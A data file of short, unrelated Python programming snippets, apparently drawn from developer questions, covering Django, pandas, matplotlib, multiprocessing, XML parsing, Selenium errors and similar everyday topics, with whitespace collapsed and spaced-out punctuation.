' : 'django.contrib.auth.password_validation.CommonPasswordValidator ' , } , { 'NAME ' : 'django.contrib.auth.password_validation.NumericPasswordValidator ' , } , ] # Internationalization # https : //docs.djangoproject.com/en/2.0/topics/i18n/LANGUAGE_CODE = 'en-us'TIME_ZONE = 'UTC'USE_I18N = TrueUSE_L10N = TrueUSE_TZ = True # Static files ( CSS , JavaScript , Images ) # https : //docs.djangoproject.com/en/2.0/howto/static-files/STATIC_URL = '/static/ ' STATIC_ROOT = os.path.join ( BASE_DIR , 'static ' ) ( master ) $ python3 manage.py collectstaticYou have requested to collect static files at the destination location as specified in your settings : /home/ag/ag.pythonanywhere.com/new_p/staticThis will overwrite existing files ! Are you sure you want to do this ? Type 'yes ' to continue , or 'no ' to cancel : yes0 static files copied to '/home/agusm/agusm.pythonanywhere.com/new_p/static ' , 119 unmodified ."
import concurrent.futuresclass A : def f ( self ) : print ( `` called '' ) class B ( A ) : def f ( self ) : executor = concurrent.futures.ProcessPoolExecutor ( max_workers=2 ) executor.submit ( super ( ) .f ) if __name__ == `` __main__ '' : B ( ) .f ( ) import multiprocessing.poolclass A : def f ( self ) : print ( `` called '' ) class B ( A ) : def f ( self ) : pool = multiprocessing.pool.Pool ( 2 ) pool.apply ( super ( ) .f ) if __name__ == `` __main__ '' : B ( ) .f ( )
"df = pd.DataFrame ( columns= [ 'Sample ' , 'DP ' , 'GQ ' , 'AB ' ] , data= [ [ 'HG_12_34 ' , 200 , 35 , 0.4 ] , [ 'HG_12_34_2 ' , 50 , 45 , 0.9 ] , [ 'KD_89_9 ' , 76 , 67 , 0.7 ] , [ 'KD_98_9_2 ' , 4 , 78 , 0.02 ] , [ 'LG_3_45 ' , 90 , 3 , 0.8 ] , [ 'LG_3_45_2 ' , 15 , 12 , 0.9 ] ] ) def some_func ( df , cond_list ) : # wrap ampersand between multiple conditions all_conds = ? return df [ all_conds ] cond1 = df [ 'DP ' ] > 40cond2 = df [ 'GQ ' ] > 40cond3 = df [ 'AB ' ] < 0.4some_func ( df , [ cond1 , cond2 ] ) # should return df [ cond1 & cond2 ] some_func ( df , [ cond1 , cond3 , cond2 ] ) # should return df [ cond1 & cond3 & cond2 ]"
def common_setup ( ) : # time consuming code passdef common_teardown ( ) : # tidy up passdef test_1 ( ) : passdef test_2 ( ) : pass # desired behaviorcommon_setup ( ) test_1 ( ) test_2 ( ) common_teardown ( )
"import matplotlib.pyplot as pltfig = plt.figure ( ) plt.axis ( [ 0 , 10 , 0 , 10 ] ) t = `` This is a really long string that I 'd rather have wrapped so that it '' \ `` does n't go outside of the figure , but if it 's long enough it will go '' \ `` off the top or bottom ! `` plt.text ( 4 , 1 , t , ha='left ' , rotation=15 , wrap=True ) plt.text ( 6 , 5 , t , ha='left ' , rotation=15 , wrap=True ) plt.text ( 5 , 5 , t , ha='right ' , rotation=-15 , wrap=True ) plt.text ( 5 , 10 , t , fontsize=18 , style='oblique ' , ha='center ' , va='top ' , wrap=True ) plt.text ( 3 , 4 , t , family='serif ' , style='italic ' , ha='right ' , wrap=True ) plt.text ( -1 , 0 , t , ha='left ' , rotation=-15 , wrap=True ) plt.show ( )"
"df [ 'DOB ' ] 0 01-01-841 31-07-852 24-08-853 30-12-934 09-12-775 08-09-906 01-06-887 04-10-898 15-11-919 01-06-68Name : DOB , dtype : object print ( pd.to_datetime ( df1 [ 'Date.of.Birth ' ] ) ) 0 1984-01-011 1985-07-312 1985-08-243 1993-12-304 1977-09-125 1990-08-096 1988-01-067 1989-04-108 1991-11-159 2068-01-06Name : DOB , dtype : datetime64 [ ns ]"
"for each pixel : if i1 ( x , y ) > i2 ( x , y ) , then i2 ( x , y ) = i2 ( x , y ) + 1 if i1 ( x , y ) < i2 ( x , y ) , then i2 ( x , y ) = i2 ( x , y ) - 1 for x in range ( width ) : for y in range ( height ) : if Mt [ x , y ] > It [ x , y ] : Mt [ x , y ] = Mt [ x , y ] +1 elif Mt [ x , y ] < It [ x , y ] : Mt [ x , y ] = Mt [ x , y ] -1"
"class MyErr ( Exception ) : def __init__ ( self , *args ) : Exception.__init__ ( self , *args ) self.context = sys.exc_info ( ) [ 1 ] def __str__ ( self ) : return repr ( self.args ) + ' from ' + repr ( self.context ) try : 1/0except : raise MyErr ( 'bang ! ' ) # > __main__.MyErr : ( 'bang ! ' , ) from ZeroDivisionError ( 'integer division or modulo by zero ' , ) raise MyErr ( 'just so ' ) # > __main__.MyErr : ( 'just so ' , ) from None try : print xxxexcept Exception as e : pass # ... 1000 lines of code ... .raise MyErr ( 'look out ' ) # > __main__.MyErr : ( 'look out ' , ) from NameError ( `` name 'xxx ' is not defined '' , ) < -- BAD"
"python boo.py spark-submit -- verbose -- deploy-mode cluster -- master yarn boo.py Traceback ( most recent call last ) : File `` boo.py '' , line 17 , in < module > import boto3ImportError : No module named boto3 $ which python/usr/bin/python $ pip install boto3Requirement already satisfied ( use -- upgrade to upgrade ) : boto3 in /usr/local/lib/python2.7/site-packages"
"# ! /usr/bin/python3from PyPDF2 import PdfFileReaderpdfFile = PdfFileReader ( open ( `` document.pdf '' , `` rb '' ) ) print ( pdfFile.numPages ) PyPDF2.utils.PdfReadError : File has not been decrypted"
"print `` % .*g\t % . *g '' % ( xprecision , a , yprecision , b ) print `` % .*g\t % . *g '' % ( 5 , 2.23523523 , 3 , 12.353262 ) 2.2352 12.4"
"< ? xml version= '' 1.0 '' ? > < ! -- Sample XML Document -- > < bookstore > < book _id= '' E7854 '' > < title > Sample XML Book < /title > < author > < name _id= '' AU363 '' > < first > Benjamin < /first > < last > Smith < /last > < /name > < affiliation > A < /affiliation > < /author > < chapter number= '' 1 '' > < title > First Chapter < /title > < para > B < count > 783 < /count > . < /para > < /chapter > < chapter number= '' 3 '' > < title > Third Chapter < /title > < para > B < count > 59 < /count > . < /para > < /chapter > < /book > < book _id= '' C843 '' > < title > XML Master < /title > < author > < name _id= '' AU245 '' > < first > John < /first > < last > Doe < /last > < /name > < affiliation > C < /affiliation > < /author > < chapter number= '' 2 '' > < title > Second Chapter < /title > < para > K < count > 54 < /count > . < /para > < /chapter > < chapter number= '' 3 '' > < title > Third Chapter < /title > < para > K < count > 328 < /count > . < /para > < /chapter > < chapter number= '' 7 '' > < title > Seventh Chapter < /title > < para > K < count > 265 < /count > . < /para > < /chapter > < chapter number= '' 9 '' > < title > Ninth Chapter < /title > < para > K < count > 356 < /count > . < /para > < /chapter > < /book > < /bookstore > from xml.dom import minidom , Nodeimport re , textwrapclass SampleScanner : def __init__ ( self , doc ) : for child in doc.childNodes : if child.nodeType == Node.ELEMENT_NODE and child.tagName == 'bookstore ' : self.handleBookStore ( child ) def gettext ( self , nodelist ) : retlist = [ ] for node in nodelist : if node.nodeType == Node.TEXT_NODE : retlist.append ( node.wholeText ) elif node.hasChildNodes : retlist.append ( self.gettext ( node.childNodes ) ) return re.sub ( '\s+ ' , ' ' , `` .join ( retlist ) ) def handleBookStore ( self , node ) : for child in node.childNodes : if child.nodeType ! = Node.ELEMENT_NODE : continue if child.tagName == 'book ' : self.handleBook ( child ) def handleBook ( self , node ) : for child in node.childNodes : if child.nodeType ! = Node.ELEMENT_NODE : continue if child.tagName == 'title ' : print `` Book title is : '' , self.gettext ( child.childNodes ) if child.tagName == 'author ' : self.handleAuthor ( child ) if child.tagName == 'chapter ' : self.handleChapter ( child ) def handleAuthor ( self , node ) : for child in node.childNodes : if child.nodeType ! = Node.ELEMENT_NODE : continue if child.tagName == 'name ' : self.handleAuthorName ( child ) elif child.tagName == 'affiliation ' : print `` Author affiliation : '' , self.gettext ( [ child ] ) def handleAuthorName ( self , node ) : surname = self.gettext ( node.getElementsByTagName ( `` last '' ) ) givenname = self.gettext ( node.getElementsByTagName ( `` first '' ) ) print `` Author Name : % s , % s '' % ( surname , givenname ) def handleChapter ( self , node ) : print `` *** Start of Chapter % s : % s '' % ( node.getAttribute ( 'number ' ) , self.gettext ( node.getElementsByTagName ( 'title ' ) ) ) for child in node.childNodes : if child.nodeType ! = Node.ELEMENT_NODE : continue if child.tagName == 'para ' : self.handlePara ( child ) def handlePara ( self , node ) : partext = self.gettext ( [ node ] ) partext = textwrap.fill ( partext ) print partext printdoc = minidom.parse ( 'book.xml ' ) SampleScanner ( doc ) Book ID : E7854Book title is : Sample XML Book Name ID : AU363Author Name : Smith , Benjamin Author affiliation : A *** Start of Chapter 1 : First Chapter B 783 . *** Start of Chapter 3 : Third Chapter B 59 .Book ID : C843Book title is : XML Master Name ID : AU245Author Name : Doe , John Author affiliation : C *** Start of Chapter 2 : Second Chapter K 54 . *** Start of Chapter 3 : Third Chapter K 328 . *** Start of Chapter 7 : Seventh Chapter K 265 . *** Start of Chapter 9 : Ninth Chapter K 356 . **Book table : **id |titleE7854 Sample XML Book ... .**Chapter table : **book_id|chapter_number|title |paraE7854 1 First Chapter B 783 .E7854 3 Third Chapter B 59 ... ..**Author table : **id |book_id |name |AffiliationAU363 E7854 Smith Benjamin A ... ."
> > > d = { } > > > s = str ( d ) > > > print s { }
class User ( DjangoUserModel ) : pass class Admin ( User ) : pass class API ( User ) : passAUTH_USER_MODEL = `` User ''
import inspectimport sysdef calling_module ( level=0 ) : filename = inspect.stack ( ) [ level+2 ] [ 1 ] modulename = inspect.getmodulename ( filename ) try : return sys.modules [ modulename ] except KeyError : return sys.modules [ '__main__ ' ]
import clrclr.AddRferenceToFileAndPath ( r ' C : \foo.dll ' )
"digraph G { A - > BB - > CC - > AB - > D } import graphvizgraphvix.dot ( ' G.gv ' , view=True ) # .gv file is read and plot is produced and shown"
"d = { 94111 : { ' a ' : 5 , ' b ' : 7 , 'd ' : 7 } , 95413 : { ' a ' : 6 , 'd ' : 4 } , 84131 : { ' a ' : 5 , ' b ' : 15 , ' c ' : 10 , 'd ' : 11 } , 73173 : { ' a ' : 15 , ' c ' : 10 , 'd ' : 15 } , 80132 : { ' b ' : 7 , ' c ' : 7 , 'd ' : 7 } } states = { 94111 : `` TX '' , 84131 : `` TX '' , 95413 : `` AL '' , 73173 : `` AL '' , 80132 : `` AL '' } { 'TX ' : { ' a ' : 10 , ' b ' : 22 , 'd ' : 18 , ' c ' : 10 } , 'AL ' : { ' a ' : 21 , 'd ' : 26 , ' c ' : 17 , ' b ' : 7 } } def zips ( d , states ) : result = dict ( ) for key , value in db.items ( ) : for keys , values in states.items ( ) : if key == keys : zips ( d , states )"
"'24 ' '277 ' '277 24 ' '139 24 ' '139 277 24 ' '139 277 ' '139 ' '136 24 ' '136 277 24 ' '136 277 ' '136 ' '136 139 24 ' '136 139 277 24 ' '136 139 277 ' '136 139 ' '246 ' '136 139 277 24 ' '246 ' # First create a set of tuplesallSeqsTuple = set ( ) for seq in allSeqs : # allSeqs store the sequences described above x = seq.split ( ) allSeqsTuple.add ( tuple ( x ) ) # For each 'allSeqs ' , find if all the items in that seq that is in 'allSeqsTuple ' . for line in allSeqs : x = set ( line.split ( ) ) result = findContainment ( x , allSeqsTuple ) ... ... ... ... def findContainment ( x , allSeqsTuple ) : contained = False for y in allSeqsTuple : cntnd = bool ( x-set ( y ) ) if ( cntnd ) : contained = True continue else : break return contained"
"a < - c ( 1,2,3,4,5 ) b < - roll ( a , 2 ) # 4,5,1,2,3"
"> > > 1.0 // 2.0 # floors result , returns float0.0 > > > -1 // 2 # negatives are still floored-1 > > > import math > > > x = 0.5 > > > y = 0.1 > > > x / y5.0 > > > math.floor ( x/y ) 5.0 > > > x // y4.0 > > > ( .5*10 ) // ( .1*10 ) 5.0 > > > .1 // .11.0"
"File `` google_scrape.py '' , line 18 , in _get_data driver.execute_script ( `` arguments [ 0 ] .scrollIntoView ( true ) ; '' , e ) File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/webdriver.py '' , line 396 , in execute_script { 'script ' : script , 'args ' : converted_args } ) [ 'value ' ] File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/webdriver.py '' , line 162 , in execute response = self.command_executor.execute ( driver_command , params ) File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/remote_connection.py '' , line 355 , in execute return self._request ( url , method=command_info [ 0 ] , data=data ) File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/remote_connection.py '' , line 402 , in _request response = opener.open ( request ) File `` /usr/lib64/python2.7/urllib2.py '' , line 404 , in open response = self._open ( req , data ) File `` /usr/lib64/python2.7/urllib2.py '' , line 422 , in _open '_open ' , req ) File `` /usr/lib64/python2.7/urllib2.py '' , line 382 , in _call_chain result = func ( *args ) File `` /usr/lib64/python2.7/urllib2.py '' , line 1214 , in http_open return self.do_open ( httplib.HTTPConnection , req ) File `` /usr/lib64/python2.7/urllib2.py '' , line 1184 , in do_open raise URLError ( err ) urllib2.URLError : < urlopen error [ Errno 111 ] Connection refused > File `` google_scrape.py '' , line 19 , in _get_data if e.text.strip ( ) : File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/webelement.py '' , line 55 , in text return self._execute ( Command.GET_ELEMENT_TEXT ) [ 'value ' ] File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/webelement.py '' , line 233 , in _execute return self._parent.execute ( command , params ) File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/webdriver.py '' , line 162 , in execute response = self.command_executor.execute ( driver_command , params ) File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/remote_connection.py '' , line 355 , in execute return self._request ( url , method=command_info [ 0 ] , data=data ) File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/remote_connection.py '' , line 402 , in _request response = opener.open ( request ) File `` /usr/lib64/python2.7/urllib2.py '' , line 404 , in open response = self._open ( req , data ) File `` /usr/lib64/python2.7/urllib2.py '' , line 422 , in _open '_open ' , req ) File `` /usr/lib64/python2.7/urllib2.py '' , line 382 , in _call_chain result = func ( *args ) File `` /usr/lib64/python2.7/urllib2.py '' , line 1214 , in http_open return self.do_open ( httplib.HTTPConnection , req ) File `` /usr/lib64/python2.7/urllib2.py '' , line 1187 , in do_open r = h.getresponse ( buffering=True ) File `` /usr/lib64/python2.7/httplib.py '' , line 1045 , in getresponse response.begin ( ) File `` /usr/lib64/python2.7/httplib.py '' , line 409 , in begin version , status , reason = self._read_status ( ) File `` /usr/lib64/python2.7/httplib.py '' , line 373 , in _read_status raise BadStatusLine ( line ) httplib.BadStatusLine : `` File `` google_scrape.py '' , line 19 , in _get_data if e.text.strip ( ) : File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/webelement.py '' , line 55 , in text return self._execute ( Command.GET_ELEMENT_TEXT ) [ 'value ' ] File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/webelement.py '' , line 233 , in _execute return self._parent.execute ( command , params ) File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/webdriver.py '' , line 162 , in execute response = self.command_executor.execute ( driver_command , params ) File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/remote_connection.py '' , line 355 , in execute return self._request ( url , method=command_info [ 0 ] , data=data ) File `` /home/ryne/.virtualenvs/DEV/lib/python2.7/site-packages/selenium/webdriver/remote/remote_connection.py '' , line 402 , in _request response = opener.open ( request ) File `` /usr/lib64/python2.7/urllib2.py '' , line 404 , in open response = self._open ( req , data ) File `` /usr/lib64/python2.7/urllib2.py '' , line 422 , in _open '_open ' , req ) File `` /usr/lib64/python2.7/urllib2.py '' , line 382 , in _call_chain result = func ( *args ) File `` /usr/lib64/python2.7/urllib2.py '' , line 1214 , in http_open return self.do_open ( httplib.HTTPConnection , req ) File `` /usr/lib64/python2.7/urllib2.py '' , line 1187 , in do_open r = h.getresponse ( buffering=True ) File `` /usr/lib64/python2.7/httplib.py '' , line 1045 , in getresponse response.begin ( ) File `` /usr/lib64/python2.7/httplib.py '' , line 409 , in begin version , status , reason = self._read_status ( ) File `` /usr/lib64/python2.7/httplib.py '' , line 365 , in _read_status line = self.fp.readline ( _MAXLINE + 1 ) File `` /usr/lib64/python2.7/socket.py '' , line 476 , in readline data = self._sock.recv ( self._rbufsize ) socket.error : [ Errno 104 ] Connection reset by peer html = lxml.html.fromstring ( driver.page_source ) html = lxml.html.fromstring ( driver.execute_script ( `` return window.document.documentElement.outerHTML '' ) )"
"for root , dirs , files in os.walk ( folder ) : print files"
"A = array ( [ [ 2. , 13. , 25. , 1 . ] , [ 18. , 5. , 1. , 25 . ] ] ) B = array ( [ [ 2 , 1 ] , [ 0 , 3 ] ] ) array ( [ [ 25. , 13 . ] , [ 18. , 25 . ] ] ) array ( [ A [ i , b ] for i , b in enumerate ( B ) ] ) A.flat [ B + arange ( 0 , A.size , A.shape [ 1 ] ) [ : ,None ] ]"
"import pandas as pddf = pd.DataFrame ( { 'int_col ' : [ 1 , 2 ] , 'float_col ' : [ 1.23 , 4.56 ] } ) print ( df ) print ( df.dtypes ) def func ( int_and_float ) : int_val , float_val = int_and_float print ( 'int_val type : ' , type ( int_val ) ) print ( 'float_val type : ' , type ( float_val ) ) return 'int- { :03d } _float- { :5.3f } '.format ( int ( int_val ) , float_val ) df [ 'string_col ' ] = df [ [ 'int_col ' , 'float_col ' ] ] .apply ( func , axis=1 ) print ( df ) float_col int_col0 1.23 11 4.56 2float_col float64int_col int64dtype : objectint_val type : < class 'numpy.float64 ' > float_val type : < class 'numpy.float64 ' > int_val type : < class 'numpy.float64 ' > float_val type : < class 'numpy.float64 ' > float_col int_col string_col0 1.23 1 int-001_float-1.2301 4.56 2 int-002_float-4.560"
for word in words : if word== 'm ' or word== ' y ' or word== ' Y ' or word== ' p ' or word== ' Q ' or word== ' q ' or word== ' a ' or word== 'uh ' : words.remove ( word )
"import pandas as pdfrom numpy import arangea = pd.DataFrame ( arange ( 4 ) ) a.to_latex ( ) import pylab as pltimport matplotlib as mplmpl.rc ( 'text ' , usetex=True ) plt.figure ( ) ax=plt.gca ( ) plt.text ( 9,3.4 , a.to_latex ( ) , size=12 ) plt.plot ( y ) plt.show ( )"
"BaseException + -- SystemExit + -- KeyboardInterrupt + -- GeneratorExit + -- Exception + -- StopIteration + -- StandardError + -- Warning > > > GeneratorExit.__bases__ ( < type 'exceptions.BaseException ' > , ) > > > StopIteration.__bases__ ( < type 'exceptions.Exception ' > , )"
opts = parser.parse_args ( ) $ python my_test.py -- enabled_features A B C $ python my_test.py
"def f ( l= [ ] ) : l.append ( len ( l ) ) return l def f ( l= [ ] ) : l.append ( len ( l ) ) return lprint ( f ( ) + [ `` - '' ] +f ( ) + [ `` - '' ] +f ( ) ) # - > [ 0 , '- ' , 0 , 1 , '- ' , 0 , 1 , 2 ] def f ( l= [ ] ) : l.append ( len ( l ) ) return lprint ( f ( ) +f ( ) +f ( ) ) # - > [ 0 , 1 , 0 , 1 , 0 , 1 , 2 ] print ( f ( ) +f ( ) +f ( ) ) # - > [ 0 , 0 , 1 , 0 , 1 , 2 ]"
"def HeuristicCostEstimate ( start , goal ) : ( x1 , y1 ) = start ( x2 , y2 ) = goal return abs ( x1 - x2 ) + abs ( y1 - y2 ) def AStar ( grid , start , goal ) : entry = 1 openSet = [ ] heappush ( openSet , ( 1 , entry , start ) ) cameFrom = { } currentCost = { } cameFrom [ tuple ( start ) ] = None currentCost [ tuple ( start ) ] = 0 while not openSet == [ ] : current = heappop ( openSet ) [ 2 ] print ( current ) if current == goal : break for next in grid.Neighbours ( current ) : newCost = currentCost [ tuple ( current ) ] + grid.Cost ( current , next ) if tuple ( next ) not in currentCost or newCost < currentCost [ tuple ( next ) ] : currentCost [ tuple ( next ) ] = newCost priority = newCost + HeuristicCostEstimate ( goal , next ) entry +=1 heappush ( openSet , ( priority , entry , next ) ) cameFrom [ tuple ( next ) ] = current return cameFrom , current"
"print `` 9 + 16 = `` , add ( 9 , 16 ) , `` \n '' ; print `` 9 - 16 = `` , subtract ( 9 , 16 ) , `` \n '' ; use Inline Python = > < < 'END_OF_PYTHON_CODE ' ; def add ( x , y ) : return x + y def subtract ( x , y ) : return x - y END_OF_PYTHON_CODE my $ python_code = `` def add ( x , y ) : return x + y '' ; print $ python_code ; use Inline Python = > `` $ python_code '' ; print `` 9 + 16 = `` , add ( 9 , 16 ) , `` \n '' ;"
"from django.db import modelsclass Author ( models.Model ) : name = models.CharField ( max_length=100 ) class Book ( models.Model ) : author = models.ForeignKey ( Author , on_delete=models.CASCADE ) title = models.CharField ( max_length=100 ) > > > from django.forms import inlineformset_factory > > > BookFormSet = inlineformset_factory ( Author , Book , fields= ( 'title ' , ) ) > > > author = Author.objects.get ( name='Mike Royko ' ) > > > formset = BookFormSet ( instance=author )"
"# ! /usr/bin/env pythonimport sysimport tracebackdef throws ( ) : raise RuntimeError ( 'error from throws ' ) def nested ( ) : try : throws ( ) except : try : cleanup ( ) except : pass # ignore errors in cleanup raise # we want to re-raise the original errordef cleanup ( ) : raise RuntimeError ( 'error from cleanup ' ) def main ( ) : try : nested ( ) return 0 except Exception , err : traceback.print_exc ( ) return 1if __name__ == '__main__ ' : sys.exit ( main ( ) ) $ python masking_exceptions_catch.pyTraceback ( most recent call last ) : File `` masking_exceptions_catch.py '' , line 24 , in main nested ( ) File `` masking_exceptions_catch.py '' , line 14 , in nested cleanup ( ) File `` masking_exceptions_catch.py '' , line 20 , in cleanup raise RuntimeError ( 'error from cleanup ' ) RuntimeError : error from cleanup"
"class UploadHandler ( blobstore_handlers.BlobstoreUploadHandler ) : def post ( self ) : upload_files = self.get_uploads ( 'file ' ) blob_info = upload_files [ 0 ] # When using flask , request.files [ 0 ] gives correct output . self.response.out.write ( '/serve/ % s ' % blob_info.key ( ) ) upload_url = blobstore.create_upload_url ( '/upload ' ) self.response.out.write ( ' < html > < body > ' ) self.response.out.write ( ' < form action= '' % s '' method= '' POST '' enctype= '' multipart/form-data '' > ' % upload_url ) self.response.out.write ( `` '' '' Upload File : < input type= '' file '' name= '' file '' > < br > < input type= '' submit '' name= '' submit '' value= '' Submit '' > < /form > < /body > < /html > '' '' '' ) HttpParams params = new BasicHttpParams ( ) ; params.setParameter ( CoreProtocolPNames.PROTOCOL_VERSION , HttpVersion.HTTP_1_1 ) ; DefaultHttpClient mHttpClient = new DefaultHttpClient ( params ) ; HttpPost httppost = new HttpPost ( getString ( R.string.url_webservice ) + `` /upload '' ) ; MultipartEntity multipartEntity = new MultipartEntity ( HttpMultipartMode.BROWSER_COMPATIBLE ) ; multipartEntity.addPart ( `` file '' , new FileBody ( new File ( path ) ) ) ; httppost.setEntity ( multipartEntity ) ; mHttpClient.execute ( httppost , new MyUploadResponseHandler ( path ) ) ; def upload_file ( ) : if request.method == 'POST ' : file = request.files [ 'file ' ] ... list index out of rangeTraceback ( most recent call last ) : File `` /base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py '' , line 1511 , in __call__ rv = self.handle_exception ( request , response , e ) File `` /base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py '' , line 1505 , in __call__ rv = self.router.dispatch ( request , response ) File `` /base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py '' , line 1253 , in default_dispatcherreturn route.handler_adapter ( request , response ) File `` /base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py '' , line 1077 , in __call__return handler.dispatch ( ) File `` /base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py '' , line 547 , in dispatchreturn self.handle_exception ( e , self.app.debug ) File `` /base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py '' , line 545 , in dispatchreturn method ( *args , **kwargs ) File `` myapp.py '' , line 22 , in postblob_info = upload_files [ 0 ] IndexError : list index out of range"
"test_dict = { 1 : `` a '' , 2 : `` b '' } ' { } { } { } '.format ( test_dict.get ( 1 ) , test_dict.get ( 2 ) , test_dict.get ( 3 ) ) ' a b ' ' a b None '"
.. raw : : html < form action= '' txmt : //open/ ? url=file : ///Users/smcho/smcho/works/prgtask/ni/gtest_boost_options/readme.txt '' > < button type= '' submit '' > Edit < /button > < /form > .. form : : /Users/smcho/smcho/works/prgtask/ni/gtest_boost_options/readme.txt
"[ 0,0,1,0,0,1,1,0,0,0 ] def indexes2booleanvec ( size , indexes ) : v = numpy.zeros ( size ) for index in indexes : v [ index ] = 1.0 return v"
"import os , sysclass MyClass ( object ) : def check_os ( self ) : print ossys.modules [ __name__ ] = MyClass ( ) > > > import myModule > > > myModule < myModule.MyClass object at 0xf76def2c > > > > repro.check_os ( ) None > > > repro.check_os ( ) < module 'os ' from '/python/3.4.1/lib/python3.4/os.py ' > sys.modules [ __name__+'_bak ' ] = sys.modules [ __name__ ]"
"import sys , urllib2 , asyncore , socket , urlparsefrom timeit import timeitclass HTTPClient ( asyncore.dispatcher ) : def __init__ ( self , host , path ) : asyncore.dispatcher.__init__ ( self ) self.create_socket ( socket.AF_INET , socket.SOCK_STREAM ) self.connect ( ( host , 80 ) ) self.buffer = 'GET % s HTTP/1.0\r\n\r\n ' % path self.data = `` def handle_connect ( self ) : pass def handle_close ( self ) : self.close ( ) def handle_read ( self ) : self.data += self.recv ( 8192 ) def writable ( self ) : return ( len ( self.buffer ) > 0 ) def handle_write ( self ) : sent = self.send ( self.buffer ) self.buffer = self.buffer [ sent : ] url = 'http : //pacnet.karbownicki.com/api/categories/'components = urlparse.urlparse ( url ) host = components.hostname or `` path = components.pathdef fn1 ( ) : try : response = urllib2.urlopen ( url ) try : return response.read ( ) finally : response.close ( ) except : passdef fn2 ( ) : client = HTTPClient ( host , path ) asyncore.loop ( ) return client.dataif sys.argv [ 1 : ] : print 'fn1 : ' , len ( fn1 ( ) ) print 'fn2 : ' , len ( fn2 ( ) ) time = timeit ( 'fn1 ( ) ' , 'from __main__ import fn1 ' , number=1 ) print 'fn1 : % .8f sec/pass ' % ( time ) time = timeit ( 'fn2 ( ) ' , 'from __main__ import fn2 ' , number=1 ) print 'fn2 : % .8f sec/pass ' % ( time ) $ python2 test_dl.pyfn1 : 5.36162281 sec/passfn2 : 0.27681994 sec/pass $ python2 test_dl.py countfn1 : 11781fn2 : 11965fn1 : 0.30849886 sec/passfn2 : 0.30597305 sec/pass _getaddrinfo = socket.getaddrinfodef getaddrinfo ( host , port , family=0 , socktype=0 , proto=0 , flags=0 ) : return _getaddrinfo ( host , port , socket.AF_INET , socktype , proto , flags ) socket.getaddrinfo = getaddrinfo"
"class A ( object ) : @ classmethod def one ( cls ) : print ( `` I am class '' ) @ staticmethod def two ( ) : print ( `` I am static '' ) class B ( object ) : one = A.one two = A.twoB.one ( ) B.two ( ) I am classTraceback ( most recent call last ) : File `` test.py '' , line 17 , in < module > B.two ( ) TypeError : unbound method two ( ) must be called with B instance as first argument ( got nothing instead ) I am classI am static"
http : //website.com/api/v1/posts/ ? page=1 http : //website.com/api/v1/posts/ ? page=2 http : //website.com/api/v1/posts/ ? page=2 & post_id=12345 class PostList ( generics.ListAPIView ) : `` '' '' API endpoint that allows posts to be viewed `` '' '' serializer_class = serializers.PostSerializer # just a basic serializer model = Post
"# ! /usr/bin/pythonimport pygtkpygtk.require ( ' 2.0 ' ) import gtkimport threadingfrom time import sleepclass SomeNonGUIThread ( threading.Thread ) : def __init__ ( self , tid ) : super ( SomeNonGUIThread , self ) .__init__ ( ) self.tid = tid def run ( self ) : while True : print `` Client # % d '' % self.tid sleep ( 0.5 ) class App ( threading.Thread ) : def __init__ ( self ) : super ( App , self ) .__init__ ( ) self.window = gtk.Window ( ) self.window.set_size_request ( 300 , 300 ) self.window.set_position ( gtk.WIN_POS_CENTER ) self.window.connect ( 'destroy ' , gtk.main_quit ) self.window.show_all ( ) def run ( self ) : print `` Main start '' gtk.main ( ) print `` Main end '' if __name__ == `` __main__ '' : app = App ( ) threads = [ ] for i in range ( 5 ) : t = SomeNonGUIThread ( i ) threads.append ( t ) # Ready , set , go ! for t in threads : t.start ( ) # Threads work so well so far sleep ( 3 ) # And now , they freeze : - ( app.start ( )"
date = date_re.match ( text )
"def predict_proba ( self , X , raw_score=False , start_iteration=0 , num_iteration=None , pred_leaf=False , pred_contrib=False , **kwargs ) : `` '' '' Return the predicted probability for each class for each sample . Parameters -- -- -- -- -- X : array-like or sparse matrix of shape = [ n_samples , n_features ] Input features matrix . raw_score : bool , optional ( default=False ) Whether to predict raw scores . start_iteration : int , optional ( default=0 ) Start index of the iteration to predict . If < = 0 , starts from the first iteration . num_iteration : int or None , optional ( default=None ) Total number of iterations used in the prediction . If None , if the best iteration exists and start_iteration < = 0 , the best iteration is used ; otherwise , all iterations from `` start_iteration `` are used ( no limits ) . If < = 0 , all iterations from `` start_iteration `` are used ( no limits ) . pred_leaf : bool , optional ( default=False ) Whether to predict leaf index . pred_contrib : bool , optional ( default=False ) Whether to predict feature contributions . .. note : : If you want to get more explanations for your model 's predictions using SHAP values , like SHAP interaction values , you can install the shap package ( https : //github.com/slundberg/shap ) . Note that unlike the shap package , with `` pred_contrib `` we return a matrix with an extra column , where the last column is the expected value . **kwargs Other parameters for the prediction . Returns -- -- -- - predicted_probability : array-like of shape = [ n_samples , n_classes ] The predicted probability for each class for each sample . X_leaves : array-like of shape = [ n_samples , n_trees * n_classes ] If `` pred_leaf=True `` , the predicted leaf of every tree for each sample . X_SHAP_values : array-like of shape = [ n_samples , ( n_features + 1 ) * n_classes ] or list with n_classes length of such objects If `` pred_contrib=True `` , the feature contributions for each sample. `` '' '' result = super ( LGBMClassifier , self ) .predict ( X , raw_score , start_iteration , num_iteration , pred_leaf , pred_contrib , **kwargs ) if callable 